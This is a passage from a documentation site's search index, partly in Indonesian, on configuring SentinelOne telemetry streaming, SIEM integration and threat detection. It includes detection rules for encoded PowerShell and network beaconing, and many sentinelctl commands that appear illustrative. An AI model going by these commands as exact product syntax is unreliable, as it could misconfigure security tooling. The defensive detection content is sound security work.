FORMAT\n    FORMAT --&gt; COMPRESS\n\n    COMPRESS --&gt; HTTPS\n    HTTPS --&gt; BUFFER\n    BUFFER --&gt; RETRY\n\n    RETRY --&gt; SIEM\n    RETRY --&gt; LAKE\n    RETRY --&gt; STREAM\n    RETRY --&gt; ANALYTICS\n\n    style WIN_AGENT fill:#e3f2fd\n    style FILTER fill:#e8f5e8\n    style HTTPS fill:#fff3e0\n    style SIEM fill:#fce4ec</code></pre>"},{"location":"security/real-time-telemetry/#konfigurasi-real-time-telemetry","title":"\ud83d\udd27 Konfigurasi Real-Time Telemetry","text":""},{"location":"security/real-time-telemetry/#11-setup-via-management-console","title":"1.1 Setup via Management Console","text":""},{"location":"security/real-time-telemetry/#console-navigation-flow","title":"Console Navigation Flow","text":"<pre><code>flowchart LR\n    LOGIN[\"Management Console&lt;br/&gt;Login\"] --&gt; SETTINGS[\"Settings&lt;br/&gt;Menu\"]\n    SETTINGS --&gt; TELEMETRY[\"Telemetry&lt;br/&gt;Configuration\"]\n    TELEMETRY --&gt; ENABLE[\"Enable Streaming&lt;br/&gt;Toggle\"]\n    ENABLE --&gt; ENDPOINT[\"Configure Endpoint&lt;br/&gt;Destination\"]\n    ENDPOINT --&gt; FORMAT[\"Data Format&lt;br/&gt;Selection\"]\n    FORMAT --&gt; TEST[\"Test Connection&lt;br/&gt;Validation\"]\n    TEST --&gt; APPLY[\"Apply Configuration&lt;br/&gt;Deployment\"]\n\n    style LOGIN fill:#e3f2fd\n    style ENABLE fill:#e8f5e8\n    style TEST fill:#fff3e0\n    style APPLY fill:#fce4ec</code></pre>"},{"location":"security/real-time-telemetry/#step-by-step-configuration","title":"Step-by-Step Configuration","text":"<p>Step 1: Enable Real-Time Telemetry <pre><code>Console Navigation:\n1. Login to SentinelOne Management Console\n2. Navigate to Settings &gt; Endpoints &gt; Telemetry\n3. Enable \"Real-Time Telemetry Streaming\"\n4. Select telemetry scope: All Agents / Specific Groups\n</code></pre></p> <p>Step 2: Configure Destination Endpoint <pre><code>{\n  \"telemetry_config\": {\n    \"enabled\": true,\n    \"destinations\": [\n      {\n        \"name\": \"Primary SIEM\",\n        \"type\": \"https\",\n        \"url\": \"https://siem.company.com/api/events\",\n        \"format\": \"json\",\n        \"authentication\": {\n          \"type\": \"bearer_token\",\n          \"token\": \"your-api-token\"\n        },\n        \"retry_policy\": {\n          \"max_retries\": 3,\n          \"backoff_seconds\": 60\n        }\n      }\n    ],\n    \"event_types\": [\n      \"process\",\n      \"network\",\n      \"file\",\n      \"registry\",\n      \"authentication\"\n    ],\n    \"compression\": {\n      \"enabled\": true,\n      \"algorithm\": \"gzip\"\n    }\n  }\n}\n</code></pre></p>"},{"location":"security/real-time-telemetry/#12-configuration-via-sentinelctl","title":"1.2 Configuration via sentinelctl","text":""},{"location":"security/real-time-telemetry/#command-line-configuration","title":"Command-Line Configuration","text":"<pre><code># Enable real-time telemetry\nsudo sentinelctl telemetry enable \\\n  --destination \"https://siem.company.com/api/events\" \\\n  --format \"json\" \\\n  --auth-type \"bearer\" \\\n  --auth-token \"your-api-token\"\n\n# Configure specific event types\nsudo sentinelctl telemetry configure \\\n  --events \"process,network,file,registry\" \\\n  --compression \"gzip\" \\\n  --buffer-size \"10MB\" \\\n  --retry-attempts \"3\"\n\n# Test telemetry connection\nsudo sentinelctl telemetry test\n\n# View telemetry status\nsudo sentinelctl telemetry status\n</code></pre>"},{"location":"security/real-time-telemetry/#advanced-configuration-options","title":"Advanced Configuration Options","text":"<pre><code># Configure multiple destinations\nsudo sentinelctl telemetry add-destination \\\n  --name \"backup-siem\" \\\n  --url \"https://backup.siem.com/events\" \\\n  --format \"cef\" \\\n  --priority \"secondary\"\n\n# Set bandwidth throttling\nsudo sentinelctl telemetry throttle \\\n  --max-bandwidth \"10Mbps\" \\\n  --burst-limit \"50MB\"\n\n# Configure event filtering\nsudo sentinelctl telemetry filter \\\n  --exclude-processes \"chrome.exe,firefox.exe\" \\\n  --exclude-extensions \".tmp,.log\" \\\n  --min-severity \"medium\"\n</code></pre>"},{"location":"security/real-time-telemetry/#data-streaming-architecture","title":"\ud83d\udcc8 Data Streaming Architecture","text":""},{"location":"security/real-time-telemetry/#21-event-types-and-data-models","title":"2.1 Event Types and Data Models","text":""},{"location":"security/real-time-telemetry/#process-events-schema","title":"Process Events Schema","text":"<pre><code>{\n  \"event_type\": \"process\",\n  \"timestamp\": \"2024-01-15T10:30:45.123Z\",\n  \"endpoint\": {\n    \"agent_id\": \"abc123-def456-ghi789\",\n    \"hostname\": \"WORKSTATION-01\",\n    \"os\": \"Windows 10 Pro\",\n    \"ip_address\": \"192.168.1.100\"\n  },\n  \"process\": {\n    \"pid\": 1234,\n    \"parent_pid\": 5678,\n    \"name\": \"notepad.exe\",\n    \"path\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\",\n    \"command_line\": \"notepad.exe C:\\\\temp\\\\document.txt\",\n    \"user\": \"DOMAIN\\\\user123\",\n    \"hash\": {\n      \"md5\": \"5d41402abc4b2a76b9719d911017c592\",\n      \"sha1\": \"aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d\",\n      \"sha256\": \"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\"\n    },\n    \"action\": \"created\",\n    \"integrity_level\": \"medium\"\n  },\n  \"metadata\": {\n    \"rule_id\": \"R001\",\n    \"confidence\": 0.95,\n    \"tags\": [\"process-creation\", \"user-initiated\"]\n  }\n}\n</code></pre>"},{"location":"security/real-time-telemetry/#network-events-schema","title":"Network Events Schema","text":"<pre><code>{\n  \"event_type\": \"network\",\n  \"timestamp\": \"2024-01-15T10:31:00.456Z\",\n  \"endpoint\": {\n    \"agent_id\": \"abc123-def456-ghi789\",\n    \"hostname\": \"WORKSTATION-01\"\n  },\n  \"network\": {\n    \"connection_id\": \"conn_789123\",\n    \"protocol\": \"TCP\",\n    \"src_ip\": \"192.168.1.100\",\n    \"src_port\": 52341,\n    \"dst_ip\": \"8.8.8.8\",\n    \"dst_port\": 443,\n    \"direction\": \"outbound\",\n    \"bytes_sent\": 1024,\n    \"bytes_received\": 2048,\n    \"domain\": \"google.com\",\n    \"action\": \"established\"\n  },\n  \"process\": {\n    \"pid\": 1234,\n    \"name\": \"chrome.exe\",\n    \"path\": \"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\"\n  }\n}\n</code></pre>"},{"location":"security/real-time-telemetry/#22-real-time-streaming-flow","title":"2.2 Real-Time Streaming Flow","text":"<pre><code>sequenceDiagram\n    participant AGENT as SentinelOne Agent\n    participant BUFFER as Local Buffer\n    participant TRANSPORT as HTTPS Transport\n    participant DEST as Destination System\n\n    loop Continuous Monitoring\n        AGENT-&gt;&gt;AGENT: Collect Events\n        AGENT-&gt;&gt;BUFFER: Queue Events\n\n        alt Buffer Threshold Reached\n            BUFFER-&gt;&gt;TRANSPORT: Batch Send Events\n            TRANSPORT-&gt;&gt;DEST: HTTPS POST\n            DEST--&gt;&gt;TRANSPORT: ACK Response\n            TRANSPORT--&gt;&gt;BUFFER: Confirm Delivery\n            BUFFER-&gt;&gt;BUFFER: Clear Sent Events\n        else Network Unavailable\n            BUFFER-&gt;&gt;BUFFER: Store Events Locally\n            Note over BUFFER: Offline Resilience\n        end\n    end\n\n    alt Periodic Health Check\n        AGENT-&gt;&gt;DEST: Health Check Ping\n        DEST--&gt;&gt;AGENT: Status Response\n    end</code></pre>"},{"location":"security/real-time-telemetry/#data-formats-and-integration","title":"\ud83d\udd0d Data Formats and Integration","text":""},{"location":"security/real-time-telemetry/#31-supported-output-formats","title":"3.1 Supported Output Formats","text":""},{"location":"security/real-time-telemetry/#json-format-recommended","title":"JSON Format (Recommended)","text":"<pre><code>{\n  \"version\": \"1.0\",\n  \"source\": \"SentinelOne\",\n  \"events\": [\n    {\n      \"id\": \"evt_123456789\",\n      \"type\": \"process\",\n      \"timestamp\": \"2024-01-15T10:30:45.123Z\",\n      \"data\": {\n        // Event-specific data\n      }\n    }\n  ],\n  \"metadata\": {\n    \"agent_version\": \"21.7.5\",\n    \"batch_id\": \"batch_987654321\",\n    \"compression\": \"gzip\"\n  }\n}\n</code></pre>"},{"location":"security/real-time-telemetry/#cef-format-siem-compatible","title":"CEF Format (SIEM Compatible)","text":"<pre><code>CEF:0|SentinelOne|EDR|21.7.5|Process Creation|Process created|Medium|src=192.168.1.100 dst=192.168.1.1 suser=user123 fname=notepad.exe fpath=C:\\\\Windows\\\\System32\\\\notepad.exe msg=Process created by user\n</code></pre>"},{"location":"security/real-time-telemetry/#leef-format-ibm-qradar","title":"LEEF Format (IBM QRadar)","text":"<pre><code>LEEF:2.0|SentinelOne|EDR|21.7.5|Process|devTime=Jan 15 2024 10:30:45|src=192.168.1.100|usrName=user123|fileName=notepad.exe|filePath=C:\\\\Windows\\\\System32\\\\notepad.exe\n</code></pre>"},{"location":"security/real-time-telemetry/#32-siem-integration-examples","title":"3.2 SIEM Integration Examples","text":""},{"location":"security/real-time-telemetry/#splunk-hec-integration","title":"Splunk HEC Integration","text":"<pre><code># Configure Splunk HTTP Event Collector\nsudo sentinelctl telemetry configure \\\n  --destination \"https://splunk.company.com:8088/services/collector\" \\\n  --format \"json\" \\\n  --auth-type \"splunk-hec\" \\\n  --auth-token \"your-hec-token\" \\\n  --index \"sentinelone\" \\\n  --source \"sentinelone:telemetry\" \\\n  --sourcetype \"sentinelone:events\"\n</code></pre>"},{"location":"security/real-time-telemetry/#qradar-syslog-integration","title":"QRadar Syslog Integration","text":"<pre><code># Configure QRadar syslog forwarding\nsudo sentinelctl telemetry configure \\\n  --destination \"syslog://qradar.company.com:514\" \\\n  --format \"leef\" \\\n  --facility \"local0\" \\\n  --severity \"info\" \\\n  --transport \"tcp\"\n</code></pre>"},{"location":"security/real-time-telemetry/#azure-sentinel-integration","title":"Azure Sentinel Integration","text":"<pre><code># Configure Azure Sentinel Data Connector\nsudo sentinelctl telemetry configure \\\n  --destination \"https://workspace.ods.opinsights.azure.com/api/logs\" \\\n  --format \"json\" \\\n  --auth-type \"azure-workspace\" \\\n  --workspace-id \"your-workspace-id\" \\\n  --shared-key \"your-shared-key\" \\\n  --log-type \"SentinelOne\"\n</code></pre>"},{"location":"security/real-time-telemetry/#performance-optimization","title":"\ud83d\ude80 Performance Optimization","text":""},{"location":"security/real-time-telemetry/#41-bandwidth-management","title":"4.1 Bandwidth Management","text":""},{"location":"security/real-time-telemetry/#bandwidth-optimization-settings","title":"Bandwidth Optimization Settings","text":"<pre><code># Configure bandwidth throttling\nsudo sentinelctl telemetry bandwidth \\\n  --max-rate \"5Mbps\" \\\n  --burst-allowance \"20MB\" \\\n  --congestion-control \"adaptive\"\n\n# Enable smart compression\nsudo sentinelctl telemetry compression \\\n  --algorithm \"gzip\" \\\n  --level \"6\" \\\n  --min-size \"1KB\"\n\n# Configure batching for efficiency\nsudo sentinelctl telemetry batching \\\n  --batch-size \"100\" \\\n  --batch-timeout \"30s\" \\\n  --max-memory \"50MB\"\n</code></pre>"},{"location":"security/real-time-telemetry/#network-usage-monitoring","title":"Network Usage Monitoring","text":"<pre><code>#!/bin/bash\n# Monitor SentinelOne telemetry network usage\n\necho \"=== SentinelOne Telemetry Network Monitoring ===\"\n\n# Monitor network connections\necho \"Current telemetry connections:\"\nsudo netstat -an | grep :443 | grep sentinelone\n\n# Monitor bandwidth usage\necho \"Bandwidth usage (last 5 minutes):\"\nsudo sentinelctl telemetry stats --period 5m\n\n# Check buffer status\necho \"Buffer status:\"\nsudo sentinelctl telemetry buffer-status\n\n# Network latency test\necho \"Testing destination latency:\"\nsudo sentinelctl telemetry ping --destination primary\n</code></pre>"},{"location":"security/real-time-telemetry/#42-event-filtering-and-sampling","title":"4.2 Event Filtering and Sampling","text":""},{"location":"security/real-time-telemetry/#advanced-filtering-configuration","title":"Advanced Filtering Configuration","text":"<pre><code># telemetry-filters.yaml\nfilters:\n  global:\n    exclude_processes:\n      - \"chrome.exe\"\n      - \"firefox.exe\"\n      - \"teams.exe\"\n    exclude_file_extensions:\n      - \".tmp\"\n      - \".log\"\n      - \".cache\"\n    min_severity: \"medium\"\n\n  event_specific:\n    process:\n      exclude_system_processes: true\n      track_parent_child: true\n\n    network:\n      exclude_internal_traffic: true\n      track_dns_queries: true\n      min_connection_duration: \"5s\"\n\n    file:\n      exclude_temp_directories: true\n      track_executable_creation: true\n      min_file_size: \"1KB\"\n\n  sampling:\n    enabled: true\n    rate: 0.1  # 10% sampling\n    preserve_threats: true\n    preserve_alerts: true\n</code></pre> <pre><code># Apply filtering configuration\nsudo sentinelctl telemetry filters apply --config-file telemetry-filters.yaml\n\n# Enable intelligent sampling\nsudo sentinelctl telemetry sampling \\\n  --enable \\\n  --rate \"10%\" \\\n  --preserve-threats \\\n  --preserve-high-confidence\n</code></pre>"},{"location":"security/real-time-telemetry/#monitoring-and-analytics","title":"\ud83d\udcca Monitoring and Analytics","text":""},{"location":"security/real-time-telemetry/#51-telemetry-health-monitoring","title":"5.1 Telemetry Health Monitoring","text":""},{"location":"security/real-time-telemetry/#health-dashboard-metrics","title":"Health Dashboard Metrics","text":"<pre><code>graph TB\n    subgraph \"Telemetry Health Metrics\"\n        EVENTS[\"Events/Second&lt;br/&gt;Throughput Rate\"]\n        LATENCY[\"End-to-End Latency&lt;br/&gt;Processing Time\"]\n        ERRORS[\"Error Rate&lt;br/&gt;Failed Deliveries\"]\n        BUFFER[\"Buffer Utilization&lt;br/&gt;Queue Status\"]\n    end\n\n    subgraph \"Performance Indicators\"\n        CPU[\"CPU Usage&lt;br/&gt;Agent Impact\"]\n        MEMORY[\"Memory Usage&lt;br/&gt;Buffer Size\"]\n        NETWORK[\"Network Usage&lt;br/&gt;Bandwidth Consumption\"]\n        DISK[\"Disk I/O&lt;br/&gt;Local Storage\"]\n    end\n\n    subgraph \"Quality Metrics\"\n        COMPLETENESS[\"Data Completeness&lt;br/&gt;Event Coverage\"]\n        ACCURACY[\"Data Accuracy&lt;br/&gt;False Positives\"]\n        TIMELINESS[\"Data Timeliness&lt;br/&gt;Delay Metrics\"]\n    end\n\n    EVENTS --&gt; CPU\n    LATENCY --&gt; NETWORK\n    ERRORS --&gt; MEMORY\n    BUFFER --&gt; DISK\n\n    style EVENTS fill:#e3f2fd\n    style LATENCY fill:#e8f5e8\n    style COMPLETENESS fill:#fff3e0</code></pre>"},{"location":"security/real-time-telemetry/#monitoring-script","title":"Monitoring Script","text":"<pre><code>#!/bin/bash\n# SentinelOne Telemetry Health Monitor\n\necho \"=== SentinelOne Telemetry Health Check ===\"\n\n# Check telemetry service status\necho \"Telemetry Service Status:\"\nsudo sentinelctl telemetry status\n\n# Monitor event throughput\necho \"Event Throughput (last hour):\"\nsudo sentinelctl telemetry metrics --metric throughput --period 1h\n\n# Check destination connectivity\necho \"Destination Connectivity:\"\nsudo sentinelctl telemetry test-destinations\n\n# Buffer status and health\necho \"Buffer Status:\"\nsudo sentinelctl telemetry buffer-info\n\n# Error analysis\necho \"Recent Errors:\"\nsudo sentinelctl telemetry errors --last 24h\n\n# Performance impact\necho \"Performance Impact:\"\nsudo sentinelctl performance telemetry\n</code></pre>"},{"location":"security/real-time-telemetry/#52-alerting-and-notifications","title":"5.2 Alerting and Notifications","text":""},{"location":"security/real-time-telemetry/#telemetry-alerting-rules","title":"Telemetry Alerting Rules","text":"<pre><code># telemetry-alerts.yaml\nalerting_rules:\n  - name: \"High Error Rate\"\n    condition: \"error_rate &gt; 5%\"\n    duration: \"5m\"\n    severity: \"warning\"\n    notification:\n      - email: \"security-team@company.com\"\n      - slack: \"#security-alerts\"\n\n  - name: \"Telemetry Service Down\"\n    condition: \"service_status != 'running'\"\n    duration: \"1m\"\n    severity: \"critical\"\n    notification:\n      - pagerduty: \"telemetry-service\"\n\n  - name: \"High Latency\"\n    condition: \"avg_latency &gt; 30s\"\n    duration: \"10m\"\n    severity: \"warning\"\n    notification:\n      - email: \"operations@company.com\"\n\n  - name: \"Buffer Near Full\"\n    condition: \"buffer_utilization &gt; 90%\"\n    duration: \"5m\"\n    severity: \"warning\"\n    notification:\n      - slack: \"#infrastructure-alerts\"\n</code></pre>"},{"location":"security/real-time-telemetry/#security-and-compliance","title":"\ud83d\udd12 Security and Compliance","text":""},{"location":"security/real-time-telemetry/#61-data-privacy-and-encryption","title":"6.1 Data Privacy and Encryption","text":""},{"location":"security/real-time-telemetry/#encryption-in-transit","title":"Encryption in Transit","text":"<pre><code># Configure TLS encryption\nsudo sentinelctl telemetry security \\\n  --tls-version \"1.2\" \\\n  --cipher-suites \"ECDHE-RSA-AES256-GCM-SHA384,ECDHE-RSA-AES128-GCM-SHA256\" \\\n  --verify-certificates \\\n  --pin-certificates\n\n# Certificate management\nsudo sentinelctl telemetry certificates \\\n  --ca-bundle \"/etc/ssl/certs/ca-bundle.crt\" \\\n  --client-cert \"/etc/sentinelone/client.crt\" \\\n  --client-key \"/etc/sentinelone/client.key\"\n</code></pre>"},{"location":"security/real-time-telemetry/#data-masking-and-anonymization","title":"Data Masking and Anonymization","text":"<pre><code># data-masking.yaml\ndata_masking:\n  enabled: true\n  rules:\n    - field: \"process.command_line\"\n      mask_patterns:\n        - regex: \"password=\\S+\"\n          replacement: \"password=***\"\n        - regex: \"api_key=\\S+\"\n          replacement: \"api_key=***\"\n\n    - field: \"user.username\"\n      anonymization:\n        method: \"hash\"\n        salt: \"telemetry-salt-key\"\n\n    - field: \"network.src_ip\"\n      anonymization:\n        method: \"subnet_mask\"\n        mask: \"/24\"\n\n  sensitive_fields:\n    - \"user.password\"\n    - \"registry.value\"  # Only if contains credentials\n    - \"file.content\"    # Never send file contents\n</code></pre>"},{"location":"security/real-time-telemetry/#62-compliance-and-audit","title":"6.2 Compliance and Audit","text":""},{"location":"security/real-time-telemetry/#gdpr-compliance-configuration","title":"GDPR Compliance Configuration","text":"<pre><code># Configure GDPR compliance settings\nsudo sentinelctl telemetry gdpr \\\n  --enable-anonymization \\\n  --data-retention \"30d\" \\\n  --right-to-erasure \\\n  --consent-tracking\n\n# Configure data residency\nsudo sentinelctl telemetry residency \\\n  --region \"eu-west-1\" \\\n  --cross-border-restriction \\\n  --data-sovereignty\n</code></pre>"},{"location":"security/real-time-telemetry/#troubleshooting","title":"\ud83d\udd27 Troubleshooting","text":""},{"location":"security/real-time-telemetry/#common-issues-and-solutions","title":"Common Issues and Solutions","text":"Issue Symptoms Solution High Latency Events delayed &gt; 30s Check network, increase bandwidth, optimize filters Connection Failures HTTP 4xx/5xx errors Verify credentials, check firewall, validate endpoints Buffer Overflow Events dropped Increase buffer size, improve filtering, add destinations High CPU Usage Agent CPU &gt; 20% Enable sampling, reduce event types, optimize filters Certificate Errors TLS handshake failures Update certificates, check expiration, verify CA chain"},{"location":"security/real-time-telemetry/#diagnostic-commands","title":"Diagnostic Commands","text":"<pre><code># Comprehensive diagnostics\nsudo sentinelctl telemetry diagnose --full-report\n\n# Network connectivity test\nsudo sentinelctl telemetry network-test --verbose\n\n# Performance analysis\nsudo sentinelctl telemetry performance-profile --duration 5m\n\n# Log analysis\nsudo sentinelctl logs --component telemetry --level error --tail 100\n</code></pre>"},{"location":"security/real-time-telemetry/#validation-checklist","title":"Validation Checklist","text":"<ul> <li>[ ] Telemetry Enabled: Real-time streaming activated</li> <li>[ ] Destinations Configured: All target systems receiving data</li> <li>[ ] Authentication Working: API keys and certificates valid</li> <li>[ ] Data Format Correct: Events parsing correctly at destination</li> <li>[ ] Performance Acceptable: CPU/memory/network impact within limits</li> <li>[ ] Error Rate Low: &lt; 1% failed event deliveries</li> <li>[ ] Latency Acceptable: End-to-end latency &lt; 10 seconds</li> <li>[ ] Filtering Optimized: Noise reduced without losing important events</li> <li>[ ] Security Compliant: Encryption and privacy controls in place</li> <li>[ ] Monitoring Active: Health checks and alerting configured</li> </ul> <p>Untuk bantuan lebih lanjut dengan real-time telemetry, hubungi Security Team atau rujuk ke SentinelOne Telemetry Documentation.</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"security/threat-detection/","title":"Konfigurasi Deteksi Ancaman di SentinelOne","text":"<p>Panduan komprehensif untuk mengkonfigurasi, mengelola, dan mengoptimalkan sistem deteksi ancaman SentinelOne EDR.</p>"},{"location":"security/threat-detection/#arsitektur-deteksi-ancaman","title":"\ud83c\udfaf Arsitektur Deteksi Ancaman","text":"<pre><code>flowchart TB\n    subgraph \"Threat Detection Engine\"\n        STATIC[\"Static Analysis&lt;br/&gt;File Signatures\"]\n        DYNAMIC[\"Dynamic Analysis&lt;br/&gt;Behavioral Engine\"]\n        HEURISTIC[\"Heuristic Analysis&lt;br/&gt;Pattern Recognition\"]\n        ML[\"Machine Learning&lt;br/&gt;AI-based Detection\"]\n    end\n\n    subgraph \"Detection Sources\"\n        FILES[\"File Operations&lt;br/&gt;Real-time Scanning\"]\n        NETWORK[\"Network Traffic&lt;br/&gt;Communication Analysis\"]\n        PROCESS[\"Process Behavior&lt;br/&gt;Execution Monitoring\"]\n        REGISTRY[\"Registry Changes&lt;br/&gt;System Modifications\"]\n    end\n\n    subgraph \"Response Actions\"\n        QUARANTINE[\"Quarantine&lt;br/&gt;Isolate Threats\"]\n        TERMINATE[\"Terminate&lt;br/&gt;Stop Processes\"]\n        ALERT[\"Alert Generation&lt;br/&gt;Notify Analysts\"]\n        ROLLBACK[\"Rollback&lt;br/&gt;Undo Changes\"]\n    end\n\n    FILES --&gt; STATIC\n    FILES --&gt; DYNAMIC\n    NETWORK --&gt; HEURISTIC\n    PROCESS --&gt; DYNAMIC\n    REGISTRY --&gt; HEURISTIC\n\n    STATIC --&gt; ML\n    DYNAMIC --&gt; ML\n    HEURISTIC --&gt; ML\n\n    ML --&gt; QUARANTINE\n    ML --&gt; TERMINATE\n    ML --&gt; ALERT\n    ML --&gt; ROLLBACK\n\n    style ML fill:#e3f2fd\n    style QUARANTINE fill:#e8f5e8\n    style ALERT fill:#fff3e0</code></pre>"},{"location":"security/threat-detection/#konfigurasi-deteksi-melalui-management-console","title":"\ud83d\udd27 Konfigurasi Deteksi Melalui Management Console","text":""},{"location":"security/threat-detection/#1-akses-pengaturan-deteksi","title":"1. Akses Pengaturan Deteksi","text":"<pre><code>Console Navigation:\nManagement Console &gt; Sentinels &gt; [Select Site/Group] &gt; Policies &gt; Threat Detection\n</code></pre>"},{"location":"security/threat-detection/#2-konfigurasi-detection-modes","title":"2. Konfigurasi Detection Modes","text":""},{"location":"security/threat-detection/#mode-proteksi","title":"Mode Proteksi","text":"Mode Deskripsi Penggunaan Dampak Performa Detect Only Hanya deteksi, tidak blocking Testing, compliance Minimal Protect Deteksi + blocking otomatis Production (recommended) Low Advanced Full protection + advanced features High-security environments Medium <p>Konfigurasi melalui Console: <pre><code>Policies &gt; Protection Mode\n\u250c\u2500 Detection Mode: Protect\n\u251c\u2500 Real-time Protection: Enabled\n\u251c\u2500 Behavioral Analysis: Enabled\n\u2514\u2500 Cloud Intelligence: Enabled\n</code></pre></p>"},{"location":"security/threat-detection/#3-pengaturan-sensitivitas-deteksi","title":"3. Pengaturan Sensitivitas Deteksi","text":""},{"location":"security/threat-detection/#tingkat-sensitivitas","title":"Tingkat Sensitivitas","text":"<p>Low Sensitivity (Recommended for Production): <pre><code>Threshold Settings:\n\u250c\u2500 False Positive Rate: &lt; 0.1%\n\u251c\u2500 Detection Confidence: &gt; 90%\n\u251c\u2500 Behavioral Score: &gt; 8.0\n\u2514\u2500 Machine Learning Threshold: Conservative\n</code></pre></p> <p>Medium Sensitivity (Balanced): <pre><code>Threshold Settings:\n\u250c\u2500 False Positive Rate: &lt; 0.5%\n\u251c\u2500 Detection Confidence: &gt; 85%\n\u251c\u2500 Behavioral Score: &gt; 6.5\n\u2514\u2500 Machine Learning Threshold: Moderate\n</code></pre></p> <p>High Sensitivity (Security-focused): <pre><code>Threshold Settings:\n\u250c\u2500 False Positive Rate: &lt; 1.0%\n\u251c\u2500 Detection Confidence: &gt; 80%\n\u251c\u2500 Behavioral Score: &gt; 5.0\n\u2514\u2500 Machine Learning Threshold: Aggressive\n</code></pre></p>"},{"location":"security/threat-detection/#konfigurasi-detection-rules-via-sentinelctl","title":"\u2699\ufe0f Konfigurasi Detection Rules via sentinelctl","text":""},{"location":"security/threat-detection/#1-melihat-konfigurasi-deteksi-saat-ini","title":"1. Melihat Konfigurasi Deteksi Saat Ini","text":"<pre><code># Linux/macOS\nsudo /opt/sentinelone/bin/sentinelctl policy show --section detection\n\n# Windows\n\"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" policy show --section detection\n</code></pre>"},{"location":"security/threat-detection/#2-mengatur-detection-sensitivity","title":"2. Mengatur Detection Sensitivity","text":"<pre><code># Set detection sensitivity level\nsudo sentinelctl detection sensitivity --level medium\n\n# Enable/disable specific detection types\nsudo sentinelctl detection enable --type behavioral\nsudo sentinelctl detection enable --type static\nsudo sentinelctl detection enable --type heuristic\n\n# Configure detection thresholds\nsudo sentinelctl detection threshold --behavioral 7.0 --confidence 85\n</code></pre>"},{"location":"security/threat-detection/#3-mengelola-detection-exclusions","title":"3. Mengelola Detection Exclusions","text":"<pre><code># Add process exclusion\nsudo sentinelctl exclusions add --type process --value \"trusted_app.exe\"\n\n# Add path exclusion\nsudo sentinelctl exclusions add --type path --value \"/opt/trusted_software/*\"\n\n# Add hash exclusion\nsudo sentinelctl exclusions add --type hash --value \"sha1:a1b2c3d4e5f6...\"\n\n# List all exclusions\nsudo sentinelctl exclusions list\n</code></pre>"},{"location":"security/threat-detection/#advanced-detection-configuration","title":"\ud83c\udf9b\ufe0f Advanced Detection Configuration","text":""},{"location":"security/threat-detection/#1-behavioral-analysis-tuning","title":"1. Behavioral Analysis Tuning","text":""},{"location":"security/threat-detection/#behavioral-indicators-configuration","title":"Behavioral Indicators Configuration","text":"<pre><code># Configure behavioral detection parameters\nsudo sentinelctl detection behavioral --config \"\n{\n    'process_injection': {\n        'enabled': true,\n        'sensitivity': 'medium',\n        'threshold': 7.5\n    },\n    'credential_access': {\n        'enabled': true,\n        'sensitivity': 'high',\n        'threshold': 8.0\n    },\n    'lateral_movement': {\n        'enabled': true,\n        'sensitivity': 'medium',\n        'threshold': 7.0\n    },\n    'persistence': {\n        'enabled': true,\n        'sensitivity': 'high',\n        'threshold': 8.5\n    }\n}\"\n</code></pre>"},{"location":"security/threat-detection/#custom-behavioral-rules","title":"Custom Behavioral Rules","text":"<pre><code>{\n    \"custom_rules\": [\n        {\n            \"name\": \"Suspicious PowerShell Activity\",\n            \"description\": \"Detect encoded PowerShell commands\",\n            \"conditions\": [\n                {\n                    \"process_name\": \"powershell.exe\",\n                    \"command_line_contains\": \"-EncodedCommand\",\n                    \"parent_process_not\": [\"explorer.exe\", \"cmd.exe\"]\n                }\n            ],\n            \"action\": \"alert_and_log\",\n            \"severity\": \"high\"\n        },\n        {\n            \"name\": \"Unusual Network Beaconing\",\n            \"description\": \"Detect consistent outbound connections\",\n            \"conditions\": [\n                {\n                    \"network_frequency\": \"&gt; 10 connections per minute\",\n                    \"destination_type\": \"external\",\n                    \"duration\": \"&gt; 5 minutes\"\n                }\n            ],\n            \"action\": \"alert\",\n            \"severity\": \"medium\"\n        }\n    ]\n}\n</code></pre>"},{"location":"security/threat-detection/#2-machine-learning-model-tuning","title":"2. Machine Learning Model Tuning","text":"<pre><code># Configure ML detection parameters\nsudo sentinelctl detection ml --config \"\n{\n    'model_update_frequency': '24h',\n    'confidence_threshold': 0.85,\n    'false_positive_learning': true,\n    'local_learning': true,\n    'cloud_intelligence': true\n}\"\n\n# View ML model status\nsudo sentinelctl detection ml status\n</code></pre>"},{"location":"security/threat-detection/#3-network-detection-configuration","title":"3. Network Detection Configuration","text":"<pre><code># Configure network monitoring\nsudo sentinelctl detection network --enable\n\n# Set network detection parameters\nsudo sentinelctl detection network --config \"\n{\n    'monitor_dns': true,\n    'monitor_http': true,\n    'monitor_ssl': true,\n    'deep_packet_inspection': false,\n    'c2_detection': true,\n    'data_exfiltration_detection': true\n}\"\n</code></pre>"},{"location":"security/threat-detection/#detection-response-configuration","title":"\ud83d\udea8 Detection Response Configuration","text":""},{"location":"security/threat-detection/#1-automated-response-actions","title":"1. Automated Response Actions","text":""},{"location":"security/threat-detection/#mengatur-response-per-threat-type","title":"Mengatur Response per Threat Type","text":"<pre><code># Configure response actions\nsudo sentinelctl response configure --threat-type malware --action quarantine\nsudo sentinelctl response configure --threat-type suspicious --action alert\nsudo sentinelctl response configure --threat-type pua --action log\n\n# Advanced response configuration\nsudo sentinelctl response advanced --config \"\n{\n    'malware': {\n        'action': 'quarantine_and_rollback',\n        'notify': true,\n        'isolate_endpoint': false\n    },\n    'ransomware': {\n        'action': 'terminate_and_quarantine',\n        'notify': true,\n        'isolate_endpoint': true,\n        'backup_files': true\n    },\n    'lateral_movement': {\n        'action': 'alert_and_monitor',\n        'notify': true,\n        'isolate_endpoint': false,\n        'collect_forensics': true\n    }\n}\"\n</code></pre>"},{"location":"security/threat-detection/#2-alert-and-notification-configuration","title":"2. Alert and Notification Configuration","text":""},{"location":"security/threat-detection/#siem-integration","title":"SIEM Integration","text":"<pre><code># Configure SIEM forwarding\nsudo sentinelctl integration siem --type splunk --config \"\n{\n    'endpoint': 'https://splunk.company.com:8088',\n    'token': 'your-hec-token',\n    'index': 'sentinelone',\n    'source': 'sentinelone_edr',\n    'sourcetype': 'sentinelone:threat'\n}\"\n\n# Configure email notifications\nsudo sentinelctl notifications email --config \"\n{\n    'smtp_server': 'mail.company.com',\n    'port': 587,\n    'username': 'alerts@company.com',\n    'recipients': [\n        'security-team@company.com',\n        'soc@company.com'\n    ],\n    'severity_threshold': 